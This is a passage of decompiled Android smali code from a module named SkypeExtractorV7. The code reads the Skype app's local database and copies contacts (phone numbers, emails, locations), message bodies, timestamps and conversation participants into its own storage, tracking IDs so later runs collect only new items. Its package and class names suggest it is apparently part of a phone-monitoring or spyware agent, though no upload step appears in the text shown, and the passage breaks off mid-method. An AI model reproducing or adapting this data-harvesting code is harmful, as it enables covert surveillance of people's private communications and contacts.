    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_call_id"

    .line 482
    invoke-virtual {p0, v0, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 481
    invoke-virtual {p1, p2, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_8
    return-void
.end method

.method protected extractContacts(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 13

    const/4 v0, 0x0

    .line 196
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 197
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 204
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_contact_id"

    .line 206
    invoke-virtual {p0, v2, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 204
    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    .line 211
    :try_start_0
    new-instance v2, Lcom/hp/vd/module/custom/skype/ContactColumns;

    invoke-direct {v2}, Lcom/hp/vd/module/custom/skype/ContactColumns;-><init>()V

    const-string v4, "Contacts"

    const/4 v3, 0x7

    .line 213
    new-array v5, v3, [Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "id"

    aput-object v3, v5, v0

    const/4 v0, 0x1

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "skypename"

    aput-object v3, v5, v0

    const/4 v0, 0x2

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "country"

    aput-object v3, v5, v0

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "city"

    const/4 v12, 0x3

    aput-object v0, v5, v12

    const/4 v0, 0x4

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "phone_mobile"

    aput-object v3, v5, v0

    const/4 v0, 0x5

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "emails"

    aput-object v3, v5, v0

    const/4 v0, 0x6

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "displayname"

    aput-object v3, v5, v0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "id"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " > "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, " AND "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "type"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "=1 AND "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "is_permanent"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "=1"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const-string v11, "200"

    move-object v3, p1

    invoke-virtual/range {v3 .. v11}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1

    if-nez p1, :cond_0

    .line 233
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "SkypeExtractorV7"

    const-string v2, "Contact Cursor is null."

    invoke-interface {p1, v0, v2, v12}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    return-void

    :cond_0
    if-eqz p1, :cond_1

    move-object v0, v1

    .line 239
    :goto_0
    :try_start_1
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_2

    .line 240
    new-instance v3, Lcom/hp/vd/data/SkypeContactData;

    invoke-direct {v3}, Lcom/hp/vd/data/SkypeContactData;-><init>()V

    .line 242
    iput-object p2, v3, Lcom/hp/vd/data/SkypeContactData;->profile:Ljava/lang/String;

    .line 243
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "id"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getInt(I)I

    move-result v4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeContactData;->internalId:Ljava/lang/Integer;

    .line 245
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "skypename"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeContactData;->skypeName:Ljava/lang/String;

    .line 246
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "country"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeContactData;->country:Ljava/lang/String;

    .line 247
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "city"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeContactData;->city:Ljava/lang/String;

    .line 248
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "phone_mobile"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeContactData;->phoneMobile:Ljava/lang/String;

    .line 249
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "emails"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeContactData;->emails:Ljava/lang/String;

    .line 250
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v4, "displayname"

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {p1, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v3, Lcom/hp/vd/data/SkypeContactData;->displayName:Ljava/lang/String;

    .line 252
    iget-object v4, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeContactDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v4, v3}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 254
    iget-object v3, v3, Lcom/hp/vd/data/SkypeContactData;->internalId:Ljava/lang/Integer;

    move-object v0, v3

    goto/16 :goto_0

    :catch_0
    move-exception p1

    goto :goto_1

    :cond_1
    move-object v0, v1

    .line 258
    :cond_2
    invoke-interface {p1}, Landroid/database/Cursor;->close()V

    if-eq v1, v0, :cond_3

    .line 265
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_contact_id"

    .line 266
    invoke-virtual {p0, v2, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 265
    invoke-virtual {p1, v2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 270
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 271
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 286
    :cond_3
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV7"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Skype Contacts ("

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ") successfully extracted. "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p2, " to: "

    invoke-virtual {v3, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v2, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_1
    move-exception p1

    move-object v0, v1

    .line 274
    :goto_1
    iget-object v2, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "SkypeExtractorV7"

    const-string v4, "Error extracting data."

    invoke-interface {v2, v3, v4, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eq v1, v0, :cond_4

    .line 277
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_contact_id"

    .line 278
    invoke-virtual {p0, v0, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 277
    invoke-virtual {p1, p2, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_4
    return-void
.end method

.method protected extractMessages(Landroid/database/sqlite/SQLiteDatabase;Ljava/lang/String;)V
    .locals 13

    const/4 v0, 0x0

    .line 290
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 291
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    .line 297
    iget-object v1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "max_message_id"

    .line 299
    invoke-virtual {p0, v2, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 297
    invoke-virtual {p0, v1, v2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->safeExtractMaxId(Lcom/hp/vd/data/ModuleData;Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    .line 304
    :try_start_0
    new-instance v2, Lcom/hp/vd/module/custom/skype/MessageColumns;

    invoke-direct {v2}, Lcom/hp/vd/module/custom/skype/MessageColumns;-><init>()V

    const-string v4, "Messages"

    const/4 v3, 0x7

    .line 306
    new-array v5, v3, [Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "id"

    aput-object v3, v5, v0

    const/4 v0, 0x1

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "author"

    aput-object v3, v5, v0

    const/4 v0, 0x2

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "from_dispname"

    aput-object v3, v5, v0

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v0, "dialog_partner"

    const/4 v12, 0x3

    aput-object v0, v5, v12

    const/4 v0, 0x4

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "body_xml"

    aput-object v3, v5, v0

    const/4 v0, 0x5

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "convo_id"

    aput-object v3, v5, v0

    const/4 v0, 0x6

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "timestamp"

    aput-object v3, v5, v0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "id"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " > "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, " AND "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "chatmsg_type"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " != 18 AND "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v3, "body_xml"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " IS NOT NULL"

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    const/4 v10, 0x0

    const-string v11, "500"

    move-object v3, p1

    invoke-virtual/range {v3 .. v11}, Landroid/database/sqlite/SQLiteDatabase;->query(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    if-nez v0, :cond_0

    .line 326
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "SkypeExtractorV7"

    const-string v2, "Message Cursor is null."

    invoke-interface {p1, v0, v2, v12}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_1

    return-void

    :cond_0
    if-eqz v0, :cond_1

    move-object v3, v1

    .line 332
    :goto_0
    :try_start_1
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 333
    new-instance v4, Lcom/hp/vd/data/SkypeMessageData;

    invoke-direct {v4}, Lcom/hp/vd/data/SkypeMessageData;-><init>()V

    .line 335
    iput-object p2, v4, Lcom/hp/vd/data/SkypeMessageData;->profile:Ljava/lang/String;

    .line 336
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "id"

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->internalId:Ljava/lang/Integer;

    .line 338
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "author"

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->author:Ljava/lang/String;

    .line 339
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "from_dispname"

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->fromDisplayName:Ljava/lang/String;

    .line 340
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "dialog_partner"

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->dialogPartner:Ljava/lang/String;

    .line 341
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "body_xml"

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->bodyXml:Ljava/lang/String;

    .line 342
    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v5, "convo_id"

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v0, v5}, Landroid/database/Cursor;->getInt(I)I

    move-result v5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->conversationId:Ljava/lang/Integer;

    .line 343
    new-instance v5, Ljava/sql/Date;

    invoke-virtual {v2}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    const-string v6, "timestamp"

    invoke-interface {v0, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v0, v6}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    const-wide/16 v8, 0x3e8

    mul-long/2addr v6, v8

    invoke-direct {v5, v6, v7}, Ljava/sql/Date;-><init>(J)V

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->createdAt:Ljava/util/Date;

    .line 345
    iget-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->author:Ljava/lang/String;

    iget-object v6, v4, Lcom/hp/vd/data/SkypeMessageData;->conversationId:Ljava/lang/Integer;

    invoke-virtual {p0, v5, v6, p1}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->extractParticipents(Ljava/lang/String;Ljava/lang/Integer;Landroid/database/sqlite/SQLiteDatabase;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, v4, Lcom/hp/vd/data/SkypeMessageData;->participents:Ljava/lang/String;

    .line 351
    iget-object v5, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->skypeMessageDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v5, v4}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 353
    iget-object v4, v4, Lcom/hp/vd/data/SkypeMessageData;->internalId:Ljava/lang/Integer;

    move-object v3, v4

    goto/16 :goto_0

    :catch_0
    move-exception p1

    goto :goto_1

    :cond_1
    move-object v3, v1

    .line 357
    :cond_2
    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    if-eq v3, v1, :cond_3

    .line 364
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_message_id"

    .line 365
    invoke-virtual {p0, v0, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 364
    invoke-virtual {p1, v0, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 369
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {p1}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object p1

    invoke-virtual {p1}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object p1

    .line 370
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, v0}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    .line 385
    :cond_3
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "SkypeExtractorV7"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Skype Messages ("

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p2, ") successfully extracted. "

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string p2, " to: "

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-interface {p1, v0, p2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_1
    move-exception p1

    move-object v3, v1

    .line 373
    :goto_1
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "SkypeExtractorV7"

    const-string v4, "Error extracting data."

    invoke-interface {v0, v2, v4, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eq v3, v1, :cond_4

    .line 376
    iget-object p1, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v0, "max_message_id"

    .line 377
    invoke-virtual {p0, v0, p2}, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->constructIdentifier(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 376
    invoke-virtual {p1, p2, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_4
    return-void
.end method

.method public extractParticipents(Ljava/lang/String;Ljava/lang/Integer;Landroid/database/sqlite/SQLiteDatabase;)Ljava/lang/String;
    .locals 4

    .line 700
    iget-object v0, p0, Lcom/hp/vd/module/custom/skype/SkypeExtractorV7;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    const/4 v0, 0x0

    :try_start_0
    const-string v1, "\'"

    const-string v2, "\'"

    .line 709
    invoke-virtual {p1, v1, v2}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    const-string v1, "SELECT p.identity, c.displayname FROM Participants p LEFT JOIN Conversations c ON c.identity = p.identity WHERE p.convo_id = ? AND p.identity != ? LIMIT 5 "

    const/4 v2, 0x2

    .line 711
    new-array v2, v2, [Ljava/lang/String;

    .line 714
    invoke-virtual {p2}, Ljava/lang/Integer;->toString()Ljava/lang/String;

    move-result-object p2

    const/4 v3, 0x0

    aput-object p2, v2, v3

    const/4 p2, 0x1

    aput-object p1, v2, p2

    .line 711
    invoke-virtual {p3, v1, v2}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    if-eqz p1, :cond_5

    .line 719
    :try_start_1
    invoke-interface {p1}, Landroid/database/Cursor;->getCount()I

    move-result p3

    if-nez p3, :cond_0

    goto/16 :goto_2

    :cond_0
    const-string p3, ""

    .line 725
    :cond_1
    :goto_0
    invoke-interface {p1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_3

    .line 726
    invoke-interface {p1, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v0

    .line 727
    invoke-interface {p1, p2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_2

    .line 729
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v2

    if-lez v2, :cond_2

    .line 730
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " "

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p3, " ("

